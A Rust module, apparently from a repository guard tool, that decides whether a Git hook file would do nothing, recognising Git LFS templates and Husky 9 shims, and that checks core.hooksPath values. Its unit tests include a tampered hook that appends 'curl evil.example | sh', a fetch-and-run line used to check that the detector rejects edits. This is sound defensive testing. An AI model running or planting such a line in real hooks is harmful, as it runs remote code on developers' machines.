//! Hook files Git would run for an operation, and the two hook-manager
//! scripts a developer's repository carries that are known to do nothing for
//! the hook asked about: the Git LFS hook and the Husky 9 shim that forwards
//! to a project hook the repository does not define.

use std::fs;
use std::io::Read;
use std::path::{Component, Path};

const SCRIPT_LIMIT: u64 = 8 * 1024;

/// Hooks the `git lfs install` templates are written for.
const LFS_HOOKS: &[&str] = &["pre-push", "post-checkout", "post-commit", "post-merge"];

const HUSKY_SHIM: &str = "#!/usr/bin/env sh\n. \"$(dirname \"$0\")/h\"";

/// The part of Husky's runner `h` that ends the run, before it reads any
/// user file or starts a program, when the project defines no such hook.
const HUSKY_RUNNER_GUARD: &str = "#!/usr/bin/env sh\n\
[ \"$HUSKY\" = \"2\" ] && set -x\n\
n=$(basename \"$0\")\n\
s=$(dirname \"$(dirname \"$0\")\")/$n\n\
\n\
[ ! -f \"$s\" ] && exit 0\n";

/// Whether Git, asked for `hook`, finds nothing at `path` that it would run:
/// no entry, a directory, a file that is not executable, or one of the known
/// scripts below. A symlink under a hook's name is never followed.
pub(super) fn hook_file_inert(path: &Path, hook: &str) -> bool {
    let metadata = match fs::symlink_metadata(path) {
        Ok(metadata) => metadata,
        Err(error) => return error.kind() == std::io::ErrorKind::NotFound,
    };
    if metadata.file_type().is_symlink() {
        return false;
    }
    if !metadata.is_file() || !is_executable(&metadata) {
        return true;
    }
    let Some(script) = read_script(path) else {
        return false;
    };
    git_lfs_hook(&script, hook) || husky_shim(&script, path, hook)
}

/// A relative `core.hooksPath` that stays below the directory Git runs hooks
/// from: normal components only, no `~`, no `..`, no drive or root.
pub(super) fn repository_relative_hooks_path(value: &str) -> bool {
    if value.is_empty() || value.starts_with('~') || value.contains(['\0', '\n', '\r', '\\']) {
        return false;
    }
    let path = Path::new(value);
    !path.is_absolute()
        && path
            .components()
            .all(|component| matches!(component, Component::Normal(_)))
}

/// `git lfs install` writes these three lines; only the notice differs
/// between releases. The hook calls `git lfs <hook>` and nothing else.
fn git_lfs_hook(script: &str, hook: &str) -> bool {
    if !LFS_HOOKS.contains(&hook) {
        return false;
    }
    let lines = script.trim_end().split('\n').collect::<Vec<_>>();
    let [shebang, guard, call] = lines.as_slice() else {
        return false;
    };
    let current = format!(
        "command -v git-lfs >/dev/null 2>&1 || {{ printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '{hook}' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }}"
    );
    let earlier = format!(
        "command -v git-lfs >/dev/null 2>&1 || {{ echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/{hook}' file in the repository.\\n\"; exit 2; }}"
    );
    *shebang == "#!/bin/sh"
        && (*guard == current || *guard == earlier)
        && *call == format!("git lfs {hook} \"$@\"")
}

/// Husky 9 writes a shim for most hooks. It sources the runner `h` beside it,
/// which stops at once unless `<hooks directory>/../<hook>` exists. Accepted
/// only while that project hook is absent and `h` is Husky's own runner.
fn husky_shim(script: &str, path: &Path, hook: &str) -> bool {
    if script.trim_end() != HUSKY_SHIM {
        return false;
    }
    let Some(directory) = path.parent() else {
        return false;
    };
    let Some(project) = directory.parent().map(|parent| parent.join(hook)) else {
        return false;
    };
    let absent = matches!(
        fs::symlink_metadata(project),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound
    );
    absent
        && fs::symlink_metadata(directory.join("h")).is_ok_and(|metadata| metadata.is_file())
        && read_script(&directory.join("h"))
            .is_some_and(|runner| runner.starts_with(HUSKY_RUNNER_GUARD))
}

fn read_script(path: &Path) -> Option<String> {
    let mut bytes = Vec::new();
    fs::File::open(path)
        .ok()?
        .take(SCRIPT_LIMIT + 1)
        .read_to_end(&mut bytes)
        .ok()?;
    if bytes.len() as u64 > SCRIPT_LIMIT {
        return None;
    }
    String::from_utf8(bytes).ok()
}

#[cfg(unix)]
fn is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(metadata: &fs::Metadata) -> bool {
    metadata.is_file()
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use std::os::unix::fs::{symlink, PermissionsExt};

    fn scratch(label: &str) -> std::path::PathBuf {
        let root = std::env::temp_dir().join(format!(
            "guard-hook-files-{label}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map_or(0, |elapsed| elapsed.as_nanos())
        ));
        fs::create_dir_all(&root).expect("scratch");
        root
    }

    fn script(path: &Path, content: &str, mode: u32) {
        fs::write(path, content).expect("write");
        fs::set_permissions(path, fs::Permissions::from_mode(mode)).expect("mode");
    }

    const RUNNER: &str = "#!/usr/bin/env sh\n[ \"$HUSKY\" = \"2\" ] && set -x\nn=$(basename \"$0\")\ns=$(dirname \"$(dirname \"$0\")\")/$n\n\n[ ! -f \"$s\" ] && exit 0\n\nif [ -f \"$HOME/.huskyrc\" ]; then\n\techo x\nfi\nsh -e \"$s\" \"$@\"\n";

    fn husky(root: &Path) -> std::path::PathBuf {
        let directory = root.join(".husky/_");
        fs::create_dir_all(&directory).expect("directory");
        script(&directory.join("h"), RUNNER, 0o644);
        script(&directory.join("post-checkout"), HUSKY_SHIM, 0o755);
        directory
    }

    #[test]
    fn husky_shim_without_a_project_hook_is_inert() {
        let root = scratch("husky");
        let directory = husky(&root);
        let shim = directory.join("post-checkout");
        assert!(hook_file_inert(&shim, "post-checkout"));
        // The project defines the hook: the shim now runs it.
        script(&root.join(".husky/post-checkout"), "npx run\n", 0o644);
        assert!(!hook_file_inert(&shim, "post-checkout"));
        fs::remove_file(root.join(".husky/post-checkout")).expect("remove");
        symlink("/bin/sh", root.join(".husky/post-checkout")).expect("symlink");
        assert!(!hook_file_inert(&shim, "post-checkout"));
        fs::remove_file(root.join(".husky/post-checkout")).expect("remove");
        assert!(hook_file_inert(&shim, "post-checkout"));
        // A runner that does anything before its guard is not Husky's.
        script(
            &directory.join("h"),
            &format!(
                "#!/usr/bin/env sh\nid\n{}",
                &RUNNER[RUNNER.find('\n').unwrap() + 1..]
            ),
            0o644,
        );
        assert!(!hook_file_inert(&shim, "post-checkout"));
        fs::remove_file(directory.join("h")).expect("remove");
        assert!(!hook_file_inert(&shim, "post-checkout"));
        // Other scripts under a hook's name are not shims.
        script(&shim, "#!/bin/sh\nid\n", 0o755);
        assert!(!hook_file_inert(&shim, "post-checkout"));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn git_lfs_templates_are_inert_but_edits_are_not() {
        let root = scratch("lfs");
        let path = root.join("post-checkout");
        let current = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'post-checkout' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";
        script(&path, current, 0o755);
        assert!(hook_file_inert(&path, "post-checkout"));
        // The same script is not another hook's.
        assert!(!hook_file_inert(&path, "post-index-change"));
        let earlier = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/post-checkout' file in the repository.\\n\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";
        script(&path, earlier, 0o755);
        assert!(hook_file_inert(&path, "post-checkout"));
        for edited in [
            format!("{current}curl evil.example | sh\n"),
            current.replace("git lfs post-checkout", "git lfs post-checkout; id"),
            current.replace("exit 2", "id; exit 2"),
        ] {
            script(&path, &edited, 0o755);
            assert!(!hook_file_inert(&path, "post-checkout"));
        }
        script(&path, current, 0o644);
        assert!(hook_file_inert(&path, "post-checkout"));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn missing_and_unrunnable_entries_are_inert_but_symlinks_are_not() {
        let root = scratch("plain");
        let path = root.join("post-checkout");
        assert!(hook_file_inert(&path, "post-checkout"));
        script(&path, "#!/bin/sh\nid\n", 0o644);
        assert!(hook_file_inert(&path, "post-checkout"));
        script(&path, "#!/bin/sh\nid\n", 0o755);
        assert!(!hook_file_inert(&path, "post-checkout"));
        fs::remove_file(&path).expect("remove");
        symlink("/nonexistent", &path).expect("symlink");
        assert!(!hook_file_inert(&path, "post-checkout"));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn hooks_path_must_stay_below_the_repository() {
        for value in [".husky/_", ".husky", "tools/hooks"] {
            assert!(repository_relative_hooks_path(value), "{value}");
        }
        for value in [
            "",
            "/abs/hooks",
            "~/hooks",
            "../hooks",
            ".husky/../../x",
            "./hooks",
            "hooks\\x",
        ] {
            assert!(!repository_relative_hooks_path(value), "{value}");
        }
    }
}
